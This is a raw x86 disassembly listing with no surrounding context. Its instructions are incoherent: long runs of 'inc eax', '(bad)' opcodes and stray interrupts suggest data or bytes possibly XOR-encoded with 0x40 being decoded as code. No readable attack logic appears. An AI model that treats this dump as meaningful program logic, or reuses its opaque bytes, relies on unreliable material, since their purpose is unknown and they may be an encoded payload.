  40dad1:	mov    esp,eax
  40dad3:	bound  ecx,QWORD PTR [eax+0x40]
  40dad6:	test   DWORD PTR [ecx],0x6822052a
  40dadc:	inc    esi
  40dadd:	inc    eax
  40dade:	inc    eax
  40dadf:	inc    eax
  40dae0:	inc    eax
  40dae1:	inc    eax
  40dae2:	inc    eax
  40dae3:	inc    eax
  40dae4:	inc    eax
  40dae5:	inc    eax
  40dae6:	inc    eax
  40dae7:	std    
  40dae8:	dec    edx
  40dae9:	leave  
  40daea:	nop
  40daeb:	xchg   BYTE PTR [eax+0x70],ah
  40daee:	inc    edx
  40daef:	inc    edx
  40daf0:	push   ebx
  40daf1:	add    DWORD PTR [edx+0x70],0xe6303dd1
  40daf8:	xor    BYTE PTR [esi],cl
  40dafa:	jle    0x40da86
  40dafc:	imul   esp,DWORD PTR [ebx+0x10],0xffffffdf
  40db00:	cdq    
  40db01:	pop    es
  40db02:	rol    BYTE PTR ds:0x40404044,0x40
  40db09:	inc    eax
  40db0a:	inc    eax
  40db0b:	int3   
  40db0c:	jne    0x40db4e
  40db0e:	inc    eax
  40db0f:	inc    BYTE PTR [ebx-0x7989dd82]
  40db15:	push   ecx
  40db16:	inc    edx
  40db17:	test   al,0x75
  40db19:	mov    ebp,0x7a6ed481
  40db1e:	pop    ecx
  40db1f:	cmp    dh,bl
  40db21:	jle    0x40db62
  40db23:	bound  ecx,QWORD PTR [ecx+0x40c10040]
  40db29:	inc    eax
  40db2a:	inc    eax
  40db2b:	inc    eax
  40db2c:	add    BYTE PTR [eax+0x41],al
  40db2f:	jle    0x40db00
  40db31:	bound  edi,QWORD PTR [edi-0x17fa6d84]
  40db37:	inc    edx
  40db38:	bound  edi,QWORD PTR [ebx-0x799efe3f]
  40db3e:	retf   
  40db3f:	inc    ecx
  40db40:	sbb    BYTE PTR [edi],bl
  40db42:	dec    DWORD PTR [edx]
  40db44:	test   al,0x75
  40db46:	pusha  
  40db47:	lea    esp,[eax+0x1207403f]
  40db4d:	mov    BYTE PTR [ecx],dh
  40db4f:	outs   dx,BYTE PTR ds:[esi]
  40db50:	(bad)  
  40db51:	leave  
  40db52:	push   edx
  40db53:	push   edi
  40db54:	call   0x40811b99
  40db59:	inc    eax
  40db5a:	inc    eax
  40db5b:	inc    eax
  40db5c:	inc    eax
  40db5d:	inc    DWORD PTR [eax+0x5]
  40db60:	inc    edi
  40db61:	inc    ecx
  40db62:	sub    BYTE PTR [ebp+edx*2-0xb79eafd],ch
  40db69:	inc    eax
  40db6a:	xor    al,0xd8
  40db6c:	pop    ds
  40db6d:	rol    DWORD PTR [ebx+0x6f],cl
  40db70:	(bad)  
  40db71:	inc    ecx
  40db72:	xor    al,0xeb
  40db74:	mov    edi,0x40404082
  40db79:	inc    eax
  40db7a:	inc    eax
  40db7b:	inc    eax
  40db7c:	inc    eax
  40db7d:	inc    eax
  40db7e:	inc    eax
  40db7f:	inc    eax
  40db80:	les    eax,FWORD PTR [edi+0x7e801244]
  40db86:	dec    ecx
  40db87:	mov    dh,0x48
  40db89:	add    eax,0x40c56051
  40db8e:	inc    eax
  40db8f:	inc    eax
  40db90:	inc    eax
  40db91:	inc    eax
  40db92:	inc    eax
  40db93:	inc    eax
  40db94:	inc    eax
  40db95:	add    BYTE PTR [esi+0x61],dl
  40db98:	(bad)  
  40db99:	push   edx
  40db9a:	xchg   BYTE PTR [eax+0x43],dh
  40db9d:	push   eax
  40db9e:	xlat   BYTE PTR ds:[ebx]
  40db9f:	adc    eax,DWORD PTR [esi+0x400521e5]
  40dba5:	inc    ebx
  40dba6:	(bad)  
  40dba7:	inc    ecx
  40dba8:	das    
  40dba9:	add    eax,0x4540cb86
  40dbae:	sbb    eax,0x5865111
  40dbb3:	je     0x40dbb5
  40dbb5:	sub    al,0x40
  40dbb7:	inc    eax
  40dbb8:	inc    eax
  40dbb9:	inc    eax
  40dbba:	inc    eax
  40dbbb:	inc    eax
  40dbbc:	and    eax,0xe3404040
  40dbc1:	enter  0x3303,0x86
  40dbc5:	stos   BYTE PTR es:[edi],al
  40dbc6:	xor    edi,esi
  40dbc8:	xchg   ebp,eax
  40dbc9:	xchg   ebx,eax
  40dbca:	mov    ch,0xe4
  40dbcc:	sub    al,0x72
  40dbce:	mov    edi,0xd53c4e93
  40dbd3:	add    eax,0xdf40f085
  40dbd8:	(bad)  
  40dbd9:	push   ecx
  40dbda:	add    BYTE PTR [esi+0x4a007005],0x7b
  40dbe1:	jg     0x40dc0f
  40dbe3:	inc    eax
  40dbe4:	inc    eax
  40dbe5:	inc    eax
  40dbe6:	inc    eax
  40dbe7:	inc    eax
  40dbe8:	inc    eax
  40dbe9:	inc    eax
  40dbea:	inc    eax
  40dbeb:	inc    eax
  40dbec:	inc    eax
  40dbed:	and    eax,0x63339886
  40dbf2:	inc    edi
  40dbf3:	jae    0x40dc41
  40dbf5:	jecxz  0x40dc23
  40dbf7:	mov    ah,0xac
  40dbf9:	inc    ebp
  40dbfa:	outs   dx,BYTE PTR ds:[esi]
  40dbfb:	inc    edx
  40dbfc:	add    eax,0x40438405
  40dc01:	sub    bh,BYTE PTR [ebx-0x2f]
  40dc04:	push   edx
  40dc05:	xchg   BYTE PTR ds:0x40404040,al
  40dc0b:	inc    eax
  40dc0c:	inc    eax
  40dc0d:	rol    DWORD PTR [eax+0x40],0xbd
  40dc11:	add    BYTE PTR ds:0x32866aaa,bh
  40dc17:	xchg   BYTE PTR [ebx+esi*1-0x36],ch
  40dc1b:	xor    dh,BYTE PTR [edx+edi*1-0x1e]
  40dc1f:	sub    DWORD PTR [ebx+edi*4+0x62],esp
  40dc23:	mov    edi,DWORD PTR [edi]
  40dc25:	jle    0x40dc2c
  40dc27:	adc    DWORD PTR [eax],0x40
  40dc2a:	xor    al,0x40
  40dc2c:	inc    eax
  40dc2d:	add    BYTE PTR [eax+0x40],al
  40dc30:	inc    eax
  40dc31:	inc    eax
  40dc32:	inc    eax
  40dc33:	inc    eax
  40dc34:	jb     0x40dc5f
  40dc36:	add    al,BYTE PTR [esi-0x4fff9cfb]
  40dc3c:	push   es
  40dc3d:	jbe    0x40dc6d
  40dc3f:	xor    eax,0x63339486
  40dc44:	test   al,0xd2
  40dc46:	jle    0x40dc29
  40dc48:	cmp    al,BYTE PTR [esi+0x40]
  40dc4b:	inc    eax
  40dc4c:	inc    eax
  40dc4d:	inc    eax
  40dc4e:	inc    eax
  40dc4f:	inc    eax
  40dc50:	inc    eax
  40dc51:	inc    eax
  40dc52:	inc    eax
  40dc53:	inc    eax
  40dc54:	popf   
  40dc55:	sbb    bl,BYTE PTR [edx+0x35]
  40dc58:	add    DWORD PTR ds:0xe44f1182,0xffffffa9
  40dc5f:	inc    ebx
  40dc60:	cmc    
  40dc61:	xchg   BYTE PTR [eax+0x40],al
  40dc64:	inc    eax
  40dc65:	inc    eax
  40dc66:	inc    eax
  40dc67:	inc    eax
  40dc68:	int3   
  40dc69:	jne    0x40dcab
  40dc6b:	add    eax,0xe8624067
  40dc70:	jb     0x40dcd4
  40dc72:	sub    al,0x86
  40dc74:	inc    ebx
  40dc75:	mov    esp,0x816da605
  40dc7a:	loopne 0x40dcab
  40dc7c:	mov    esp,0x243b8740
  40dc81:	inc    esp
  40dc82:	add    eax,0xc1007781
  40dc87:	test   DWORD PTR [eax+0x0],eax
  40dc8a:	rol    DWORD PTR [eax+0x40],0x40
  40dc8e:	inc    eax
  40dc8f:	add    BYTE PTR [eax+0x1f],al
  40dc92:	add    BYTE PTR [esi-0x31cd98fb],al
  40dc98:	pop    esi
  40dc99:	inc    eax
  40dc9a:	sub    eax,0x30c48629
  40dc9f:	gs inc eax
  40dca1:	inc    eax
  40dca2:	inc    eax
  40dca3:	inc    eax
  40dca4:	inc    eax
  40dca5:	inc    eax
  40dca6:	inc    eax
  40dca7:	inc    eax
  40dca8:	inc    DWORD PTR [eax+0x1a]
  40dcab:	ror    DWORD PTR [edi-0x21],1
  40dcae:	or     eax,0x8b224062
  40dcb3:	and    al,0x1
  40dcb5:	add    eax,0xd8004380
  40dcba:	bound  esi,QWORD PTR [ebx+0x53]
  40dcbd:	xchg   BYTE PTR ds:0x76232bc,al
  40dcc3:	pop    ss
  40dcc4:	add    al,0x21
  40dcc6:	xchg   BYTE PTR [ebp+0x4],ch
  40dcc9:	les    edi,FWORD PTR [edi+0x5d]
  40dccc:	fiadd  WORD PTR cs:[eax+0x7a]
  40dcd0:	inc    eax
  40dcd1:	inc    eax
  40dcd2:	inc    eax
  40dcd3:	inc    eax
  40dcd4:	inc    eax
  40dcd5:	inc    eax
  40dcd6:	inc    eax
  40dcd7:	inc    eax
  40dcd8:	inc    eax
  40dcd9:	inc    eax
  40dcda:	mov    edi,0x45b1e24f
  40dcdf:	add    eax,0x80cba8ff
  40dce4:	rol    DWORD PTR [edx+0x4],1
  40dce7:	xchg   BYTE PTR ds:0x6ac54512,al
  40dced:	adc    DWORD PTR [ebx],esi
  40dcef:	xchg   BYTE PTR es:[eax+0x40],al
  40dcf3:	inc    eax
  40dcf4:	inc    eax
  40dcf5:	inc    eax
  40dcf6:	inc    eax
  40dcf7:	inc    eax
  40dcf8:	inc    eax
  40dcf9:	add    BYTE PTR [ebp+0x44],dl
  40dcfc:	inc    ecx
  40dcfd:	mov    ds:0x69dd9a43,al
  40dd02:	inc    ecx
  40dd03:	inc    esi
  40dd04:	fiadd  WORD PTR [esi]
  40dd06:	mov    bl,0x26
  40dd08:	add    eax,0x404040fe
  40dd0d:	inc    eax
  40dd0e:	inc    eax
  40dd0f:	inc    eax
  40dd10:	and    eax,0x5f404040
  40dd15:	inc    ebx
  40dd16:	sbb    BYTE PTR [edx],bh
  40dd18:	pop    edi
  40dd19:	mov    eax,DWORD PTR [esi+0x624bbc05]
  40dd1f:	mov    eax,ds:0x862c2131
  40dd24:	inc    esi
  40dd25:	inc    eax
  40dd26:	inc    eax
  40dd27:	inc    ecx
  40dd28:	inc    eax
  40dd29:	inc    eax
  40dd2a:	inc    eax
  40dd2b:	inc    eax
  40dd2c:	inc    eax
  40dd2d:	inc    eax
  40dd2e:	inc    eax
  40dd2f:	inc    eax
  40dd30:	inc    eax
  40dd31:	inc    eax
  40dd32:	outs   dx,DWORD PTR ds:[esi]
  40dd33:	add    eax,0x20f070dc
  40dd38:	pop    ebp
  40dd39:	mov    dl,0x96
  40dd3b:	jae    0x40dd42
  40dd3d:	std    
  40dd3e:	inc    ebx
  40dd3f:	push   cs
  40dd40:	(bad)
  40dd44:	xchg   BYTE PTR ds:0x96a860bc,al
  40dd4a:	inc    ebx
  40dd4b:	imul   eax,DWORD PTR [eax+0x40],0x40
  40dd4f:	inc    eax
  40dd50:	inc    eax
  40dd51:	inc    eax
  40dd52:	rol    DWORD PTR [eax+0x40],0x2c
  40dd56:	xchg   BYTE PTR [eax+0x40],ch
  40dd59:	adc    BYTE PTR [ecx],dh
  40dd5b:	mov    cl,0x81
  40dd5d:	fld    TBYTE PTR [esi+0x16]
  40dd60:	xor    BYTE PTR [eax+0x5ef2d77],bh
  40dd66:	cld    
  40dd67:	pop    eax
  40dd68:	ja     0x40dd6f
  40dd6a:	imul   edx,ebx,0x40
  40dd6d:	inc    eax
  40dd6e:	add    BYTE PTR [eax+0x40],al
  40dd71:	inc    eax
  40dd72:	inc    eax
  40dd73:	inc    eax
  40dd74:	inc    eax
  40dd75:	or     DWORD PTR [esi-0x32bd9cfb],eax
  40dd7b:	aas    
  40dd7c:	mov    ebx,0x3e862171
  40dd81:	inc    ecx
  40dd82:	inc    eax
  40dd83:	pop    edx
  40dd84:	inc    esp
  40dd85:	sbb    edx,0x46406475
  40dd8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd8c:	xchg   ecx,eax
  40dd8d:	inc    edi
  40dd8e:	add    eax,0x194048fb
  40dd93:	xchg   edx,eax
  40dd94:	pop    ebp
  40dd95:	add    DWORD PTR [esi+0x74417805],eax
  40dd9b:	add    BYTE PTR [ebx],dh
  40dd9d:	inc    eax
  40dd9e:	inc    eax
  40dd9f:	inc    eax
  40dda0:	inc    eax
  40dda1:	inc    eax
  40dda2:	inc    eax
  40dda3:	inc    eax
  40dda4:	inc    eax
  40dda5:	inc    eax
  40dda6:	inc    eax
  40dda7:	pop    ebx
  40dda8:	and    eax,0x62406f86
  40ddad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddae:	sub    BYTE PTR [edx],al
  40ddb0:	fldcw  WORD PTR [edi+0x1b]
  40ddb3:	push   eax
  40ddb4:	inc    esi
  40ddb5:	pop    ebx
  40ddb6:	push   ecx
  40ddb7:	mov    edi,0x77b8fa05
  40ddbc:	and    BYTE PTR [ebp+0x40404040],ah
  40ddc2:	inc    eax
  40ddc3:	inc    eax
  40ddc4:	int3   
  40ddc5:	jne    0x40de07
  40ddc7:	leave  
  40ddc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddc9:	xchg   BYTE PTR ds:0xf1404305,al
  40ddcf:	xor    ecx,eax
  40ddd1:	xor    al,BYTE PTR [esi+0x5386d0cb]
  40ddd7:	inc    ecx
  40ddd8:	add    ebx,eax
  40ddda:	inc    eax
  40dddb:	add    cl,al
  40dddd:	inc    eax
  40ddde:	inc    eax
  40dddf:	inc    eax
  40dde0:	inc    eax
  40dde1:	add    BYTE PTR [eax+0x34],al
  40dde4:	test   DWORD PTR [eax-0x57],eax
  40dde7:	jecxz  0x40ddda
  40dde9:	push   ds
  40ddea:	add    eax,0xb45cabf9
  40ddef:	sbb    eax,0x586027b
  40ddf4:	inc    ecx
  40ddf5:	jbe    0x40de38
  40ddf7:	xchg   BYTE PTR [ecx+ebp*1],dl
  40ddfa:	das    
  40ddfb:	xchg   BYTE PTR [eax+eax*2-0x22],bl
  40ddff:	inc    ebp
  40de00:	xor    cl,BYTE PTR [ebp-0x29]
  40de03:	cs enter 0x40c4,0x40
  40de08:	inc    eax
  40de09:	inc    eax
  40de0a:	inc    eax
  40de0b:	inc    eax
  40de0c:	inc    eax
  40de0d:	inc    eax
  40de0e:	inc    DWORD PTR [eax+0x7c]
  40de11:	dec    edx
  40de12:	arpl   WORD PTR [eax],ax
  40de14:	add    eax,0x6746b8f8
  40de19:	pop    ebp
  40de1a:	shl    DWORD PTR [esi],1
  40de1c:	xchg   BYTE PTR [eax+0x40],al
  40de1f:	inc    eax
  40de20:	inc    eax
  40de21:	inc    eax
  40de22:	inc    eax
  40de23:	inc    eax
  40de24:	inc    eax
  40de25:	inc    eax
  40de26:	inc    eax
  40de27:	add    eax,0xadc0460d
  40de2c:	mov    ebp,0x48862e59
  40de31:	inc    eax
  40de32:	hlt    
  40de33:	or     ebx,DWORD PTR [ecx+eax*4-0x2a]
  40de37:	and    eax,0x59634042
  40de3c:	pop    ecx
  40de3d:	and    DWORD PTR ds:0x404094f7,eax
  40de43:	inc    eax
  40de44:	inc    eax
  40de45:	inc    eax
  40de46:	inc    eax
  40de47:	inc    eax
  40de48:	inc    eax
  40de49:	add    BYTE PTR [eax],al
  40de4b:	xor    eax,0x860341df
  40de50:	add    eax,0x867c2e11
  40de55:	jae    0x40de82
  40de57:	daa    
  40de58:	inc    eax
  40de59:	inc    eax
  40de5a:	inc    eax
  40de5b:	inc    eax
  40de5c:	inc    eax
  40de5d:	inc    eax
  40de5e:	and    eax,0x86404040
  40de63:	adc    ebp,ecx
  40de65:	imul   edi,edi,0x42
  40de68:	jnp    0x40de3f
  40de6a:	and    al,0xbd
  40de6c:	inc    eax
  40de6d:	fmul   DWORD PTR [ebx]
  40de6f:	inc    eax
  40de70:	inc    eax
  40de71:	inc    eax
  40de72:	inc    eax
  40de73:	inc    eax
  40de74:	inc    eax
  40de75:	inc    eax
  40de76:	inc    eax
  40de77:	inc    eax
  40de78:	inc    eax
  40de79:	mov    bl,0x81
  40de7b:	add    eax,0x200062f6
  40de80:	add    BYTE PTR [ecx+0x52],bl
  40de83:	xchg   BYTE PTR ds:0xd1632e41,al
  40de89:	xor    eax,0xa8862981
  40de8e:	dec    edi
  40de8f:	fild   QWORD PTR [ebx]
  40de91:	pop    ebp
  40de92:	dec    ebx
  40de93:	aam    0x29
  40de95:	ret    
  40de96:	inc    eax
  40de97:	mov    BYTE PTR [esi+0x17],al
  40de9a:	add    DWORD PTR ds:0x62009bf5,0x40404040
  40dea4:	inc    eax
  40dea5:	inc    eax
  40dea6:	rol    DWORD PTR [eax+0x40],0xa7
  40deaa:	ins    BYTE PTR es:[edi],dx
  40deab:	dec    esi
  40deac:	xchg   BYTE PTR ds:0x8a402e7f,al
  40deb2:	jns    0x40deb5
  40deb4:	pusha  
  40deb5:	xchg   BYTE PTR [edx+0x64],ah
  40deb8:	jnp    0x40de64
  40deba:	es dec edx
  40debc:	shl    DWORD PTR [edx],cl
  40debe:	add    DWORD PTR [eax-0x5b],0xffffffe4
  40dec2:	xor    DWORD PTR [ebp+0x40004040],eax
  40dec8:	inc    eax
  40dec9:	inc    eax
  40deca:	inc    eax
  40decb:	inc    eax
  40decc:	inc    eax
  40decd:	add    eax,0x6200c3f4
  40ded2:	loope  0x40defb
  40ded4:	dec    esi
  40ded5:	xchg   BYTE PTR ds:0x46332e98,al
  40dedb:	repnz cmp DWORD PTR [ecx],0x8079cb86
  40dee2:	stc    
  40dee3:	mov    edi,0x4114d203
  40dee8:	inc    eax
  40dee9:	bound  ebx,QWORD PTR [edi-0xcfafb57]
  40deef:	inc    ebp
  40def0:	inc    eax
  40def1:	inc    eax
  40def2:	inc    eax
  40def3:	inc    eax
  40def4:	inc    eax
  40def5:	inc    eax
  40def6:	inc    eax
  40def7:	inc    eax
  40def8:	inc    eax
  40def9:	inc    eax
  40defa:	add    BYTE PTR [edi+ebp*1+0x43],al
  40defe:	or     DWORD PTR [esi+0x442ee005],eax
  40df04:	fcom   DWORD PTR [eax]
  40df06:	mov    esi,0x40408623
  40df0b:	inc    eax
  40df0c:	inc    eax
  40df0d:	inc    eax
  40df0e:	inc    eax
  40df0f:	int3   
  40df10:	jne    0x40df52
  40df12:	daa    
  40df13:	cmp    BYTE PTR [edi+0x77],al
  40df16:	xor    eax,DWORD PTR [ecx+edx*8+0x60]
  40df1a:	test   al,0x40
  40df1c:	xchg   BYTE PTR [eax+0x59],cl
  40df1f:	add    BYTE PTR ds:0x430040f2,0x7c
  40df26:	xchg   ecx,eax
  40df27:	and    al,BYTE PTR [esi-0x6fd1d5fb]
  40df2d:	packssdw mm6,QWORD PTR [edx]
  40df30:	sub    DWORD PTR [esi+0xf4f2349],eax
  40df36:	inc    eax
  40df37:	add    cl,al
  40df39:	inc    eax
  40df3a:	inc    eax
  40df3b:	inc    eax
  40df3c:	inc    eax
  40df3d:	add    BYTE PTR [eax-0x6f],al
  40df40:	adc    eax,0x43402a7b
  40df46:	xchg   ebx,eax
  40df47:	jno    0x40dfc6
  40df49:	add    eax,0xd1006af1
  40df4e:	aaa    
  40df4f:	jno    0x40df51
  40df51:	xchg   BYTE PTR ds:0xfceb2e3d,al
  40df57:	xor    al,BYTE PTR cs:[eax+0x40]
  40df5b:	inc    eax
  40df5c:	inc    eax
  40df5d:	inc    eax
  40df5e:	inc    eax
  40df5f:	inc    eax
  40df60:	inc    eax
  40df61:	inc    DWORD PTR [eax+0x2c]
  40df64:	xchg   BYTE PTR [eax+0x51f0a60e],ch
  40df6a:	pop    es
  40df6b:	push   es
  40df6c:	jno    0x40df83
  40df6e:	inc    eax
  40df6f:	or     ebp,esi
  40df71:	dec    edx
  40df72:	add    al,0x40
  40df74:	lock inc eax
  40df76:	inc    eax
  40df77:	inc    eax
  40df78:	inc    eax
  40df79:	inc    eax
  40df7a:	inc    eax
  40df7b:	inc    eax
  40df7c:	inc    eax
  40df7d:	inc    eax
  40df7e:	inc    eax
  40df7f:	jnp    0x40df8a
  40df81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df82:	jo     0x40df95
  40df84:	sub    DWORD PTR [edi+0x5],eax
  40df87:	mov    al,0xcd
  40df89:	sub    BYTE PTR [edi+ebx*1-0x29],bl
  40df8d:	mov    WORD PTR [esi-0x70bfafeb],es
  40df93:	pop    ds
  40df94:	or     DWORD PTR [ebp+0x6e],edx
  40df97:	retf   
  40df98:	inc    eax
  40df99:	inc    eax
  40df9a:	cmp    dh,BYTE PTR [edx+0x4bef30f5]
  40dfa0:	or     eax,0x480f8c44
  40dfa5:	inc    eax
  40dfa6:	inc    eax
  40dfa7:	inc    eax
  40dfa8:	inc    eax
  40dfa9:	inc    eax
  40dfaa:	inc    eax
  40dfab:	inc    eax
  40dfac:	inc    eax
  40dfad:	add    ch,cl
  40dfaf:	add    eax,0x3840b8d6
  40dfb4:	inc    eax
  40dfb5:	or     BYTE PTR ds:0x46620c86,al
  40dfbb:	inc    edx
  40dfbc:	push   ebp
  40dfbd:	and    al,0x86
  40dfbf:	jbe    0x40e001
  40dfc1:	inc    eax
  40dfc2:	inc    eax
  40dfc3:	inc    eax
  40dfc4:	inc    eax
  40dfc5:	inc    eax
  40dfc6:	and    eax,0x55404040
  40dfcb:	inc    eax
  40dfcc:	inc    edi
  40dfcd:	je     0x40e044
  40dfcf:	ds xor ebp,esi
  40dfd2:	cmc    
  40dfd3:	test   BYTE PTR [ebx+ecx*4+0x5cc823f],0x64
  40dfdb:	dec    edi
  40dfdc:	inc    ebx
  40dfdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfde:	jne    0x40e040
  40dfe0:	add    eax,0x904c6286
  40dfe5:	cmp    eax,0x6086ce3f
  40dfea:	adc    BYTE PTR ds:0x1757e6c,al
  40dff0:	inc    eax
  40dff1:	inc    eax
  40dff2:	inc    eax
  40dff3:	inc    eax
  40dff4:	inc    eax
  40dff5:	inc    eax
  40dff6:	inc    eax
  40dff7:	inc    eax
  40dff8:	inc    eax
  40dff9:	inc    eax
  40dffa:	xor    eax,0x43cb20ed
  40dfff:	jbe    0x40e040
  40e001:	inc    ecx
  40e002:	retf   
  40e003:	add    eax,0xc4d14fb0
  40e008:	jne    0x40df8a
  40e00a:	add    eax,0x62421f86
  40e00f:	out    dx,eax
  40e010:	aas    
  40e011:	sub    eax,DWORD PTR [esi+0xa867514]
  40e017:	std    
  40e018:	jne    0x40e062
  40e01a:	inc    eax
  40e01b:	inc    eax
  40e01c:	inc    eax
  40e01d:	inc    eax
  40e01e:	inc    eax
  40e01f:	inc    eax
  40e020:	rol    DWORD PTR [eax+0x40],0x34
  40e024:	in     al,dx
  40e025:	arpl   WORD PTR [esi+0x6d],ax
  40e028:	stos   DWORD PTR es:[edi],eax
  40e029:	aas    
  40e02a:	or     dl,0x5
  40e02d:	inc    ecx
  40e02e:	inc    edx
  40e02f:	mov    BYTE PTR [ebx-0x79fa1201],dh
  40e035:	call   0x4041207a
  40e03a:	inc    eax
  40e03b:	inc    eax
  40e03c:	inc    eax
  40e03d:	inc    eax
  40e03e:	inc    eax
  40e03f:	cmp    BYTE PTR [ecx-0x18],al
  40e042:	sub    dh,BYTE PTR [edx]
  40e044:	xchg   BYTE PTR [esi],cl
  40e046:	shl    BYTE PTR [edi+0x43],1
  40e049:	int    0xbf
  40e04b:	inc    esi
  40e04c:	and    ebx,ebp
  40e04e:	test   al,0x40
  40e050:	xor    BYTE PTR ds:0x5c900e2,bh
  40e056:	inc    ecx
  40e057:	inc    eax
  40e058:	mov    esp,0x40406243
  40e05d:	inc    eax
  40e05e:	inc    eax
  40e05f:	inc    eax
  40e060:	inc    eax
  40e061:	inc    eax
  40e062:	inc    eax
  40e063:	inc    eax
  40e064:	inc    eax
  40e065:	adc    eax,DWORD PTR ds:0x47102a86
  40e06b:	ja     0x40e0a0
  40e06d:	jbe    0x40dff5
  40e06f:	pusha  
  40e070:	adc    BYTE PTR [eax-0x7b],al
  40e073:	loope  0x40e0ee
  40e075:	xor    DWORD PTR [edx+ebp*8],0x64434d42
  40e07c:	and    esp,DWORD PTR [ebp-0x38]
  40e07f:	add    eax,0xb5905847
  40e084:	inc    eax
  40e085:	inc    eax
  40e086:	inc    eax
  40e087:	inc    eax
  40e088:	inc    eax
  40e089:	inc    eax
  40e08a:	int3   
  40e08b:	jne    0x40e0cd
  40e08d:	ins    BYTE PTR es:[edi],dx
  40e08e:	add    DWORD PTR ds:0x902e086,eax
  40e094:	pop    ecx
  40e095:	addr16 inc edi
  40e097:	xchg   BYTE PTR [ebx],dh
  40e099:	fcmovne st,st(3)
  40e09b:	test   al,0x1
  40e09d:	adc    al,BYTE PTR [ecx]
  40e09f:	xor    ebp,ecx
  40e0a1:	inc    eax
  40e0a2:	add    cl,al
  40e0a4:	inc    eax
  40e0a5:	inc    eax
  40e0a6:	inc    eax
  40e0a7:	inc    eax
  40e0a8:	add    BYTE PTR [eax+0x72],al
  40e0ab:	inc    ebp
  40e0ac:	inc    eax
  40e0ad:	out    0x65,eax
  40e0af:	dec    ecx
  40e0b0:	mov    DWORD PTR ds:0x3a2a6485,0x8605862a
  40e0ba:	sub    BYTE PTR fs:[esi+ebx*8+0x61],cl
  40e0bf:	ins    BYTE PTR es:[edi],dx
  40e0c0:	xchg   BYTE PTR [edi],dh
  40e0c2:	mov    esp,0x7db02a62
  40e0c7:	push   ds
  40e0c8:	xor    al,0xe8
  40e0ca:	int    0x3e
  40e0cc:	dec    edx
  40e0cd:	mov    al,0x68
  40e0cf:	dec    ecx
  40e0d0:	mov    BYTE PTR [eax+0x40],0x40
  40e0d4:	inc    eax
  40e0d5:	inc    eax
  40e0d6:	inc    eax
  40e0d7:	inc    eax
  40e0d8:	inc    eax
  40e0d9:	inc    DWORD PTR [eax+0x5]
  40e0dc:	cdq    
  40e0dd:	dec    edi
  40e0de:	lods   eax,DWORD PTR ds:[esi]
  40e0df:	push   edi
  40e0e0:	lahf   
  40e0e1:	adc    DWORD PTR ds:0x74b95286,eax
  40e0e7:	stos   DWORD PTR es:[edi],eax
  40e0e8:	sub    eax,0xc92f86c3
  40e0ed:	ret    
  40e0ee:	(bad)  
  40e0ef:	stos   BYTE PTR es:[edi],al
  40e0f0:	inc    esp
  40e0f1:	add    DWORD PTR [edi],ebp
  40e0f3:	out    0x26,eax
  40e0f5:	inc    eax
  40e0f6:	inc    eax
  40e0f7:	inc    eax
  40e0f8:	inc    eax
  40e0f9:	inc    eax
  40e0fa:	inc    eax
  40e0fb:	inc    eax
  40e0fc:	inc    eax
  40e0fd:	inc    eax
  40e0fe:	inc    eax
  40e0ff:	add    BYTE PTR [edi-0x73],0x60
  40e103:	dec    ecx
  40e104:	lds    eax,FWORD PTR ds:0xfe43428d
  40e10a:	add    eax,DWORD PTR [edx]
  40e10c:	add    eax,0x40404086
  40e111:	inc    eax
  40e112:	inc    eax
  40e113:	inc    eax
  40e114:	inc    eax
  40e115:	inc    eax
  40e116:	add    BYTE PTR [ebx+0x37],ah
  40e119:	xor    BYTE PTR [ebp+0x29],bh
  40e11c:	jg     0x40e0a4
  40e11e:	and    al,0xbc
  40e120:	mov    al,0xc8
  40e122:	mov    ah,0xb9
  40e124:	inc    esi
  40e125:	inc    eax
  40e126:	inc    eax
  40e127:	inc    eax
  40e128:	inc    eax
  40e129:	inc    eax
  40e12a:	inc    eax
  40e12b:	and    eax,0x2f404040
  40e130:	out    0x62,al
  40e132:	bound  eax,QWORD PTR [edi-0x2]
  40e135:	sub    DWORD PTR [ecx],eax
  40e137:	les    eax,FWORD PTR ds:0x5685c8d1
  40e13d:	mov    edi,0xbc8605af
  40e142:	add    BYTE PTR [ebx-0x40],0x40
  40e146:	inc    eax
  40e147:	inc    eax
  40e148:	inc    eax
  40e149:	inc    eax
  40e14a:	inc    eax
  40e14b:	inc    eax
  40e14c:	inc    eax
  40e14d:	inc    eax
  40e14e:	inc    eax
  40e14f:	pop    ss
  40e150:	ret    
  40e151:	xchg   BYTE PTR [esi],ch
  40e153:	inc    esp
  40e154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e155:	nop
  40e156:	in     eax,0x3d
  40e158:	push   edx
  40e159:	and    ah,ch
  40e15b:	adc    edx,eax
  40e15d:	es inc eax
  40e15f:	inc    eax
  40e160:	inc    eax
  40e161:	inc    eax
  40e162:	inc    eax
  40e163:	inc    eax
  40e164:	rol    DWORD PTR [eax+0x40],0x1d
  40e168:	adc    edx,eax
  40e16a:	ret    
  40e16b:	add    eax,0x5a438067
  40e170:	jmp    0x40e1a7
  40e172:	add    eax,0xd10db486
  40e177:	repz loop 0x40e128
  40e17a:	xchg   BYTE PTR [ecx],ch
  40e17c:	inc    esp
  40e17d:	leave  
  40e17e:	(bad)  
  40e17f:	fwait
  40e180:	in     al,0x2b
  40e182:	pusha  
  40e183:	in     al,0x11
  40e185:	dec    eax
  40e186:	enter  0x4040,0x0
  40e18a:	inc    eax
  40e18b:	inc    eax
  40e18c:	inc    eax
  40e18d:	inc    eax
  40e18e:	inc    eax
  40e18f:	inc    eax
  40e190:	adc    eax,0x5c2c11f
  40e195:	outs   dx,DWORD PTR ds:[esi]
  40e196:	or     eax,0xc732405e
  40e19b:	add    eax,0x8e6be886
  40e1a0:	fnstsw WORD PTR [esi-0x3f]
  40e1a3:	xchg   BYTE PTR [edi],dl
  40e1a5:	aam    0xac
  40e1a7:	inc    ecx
  40e1a8:	fwait
  40e1a9:	arpl   WORD PTR [eax+0x40],ax
  40e1ac:	inc    eax
  40e1ad:	inc    eax
  40e1ae:	inc    eax
  40e1af:	inc    eax
  40e1b0:	inc    eax
  40e1b1:	inc    eax
  40e1b2:	inc    eax
  40e1b3:	inc    eax
  40e1b4:	aas    
  40e1b5:	cmp    eax,0x430d94e3
  40e1ba:	fucomp st(4)
  40e1bc:	rol    ecx,0x5
  40e1bf:	inc    esp
  40e1c0:	inc    ebp
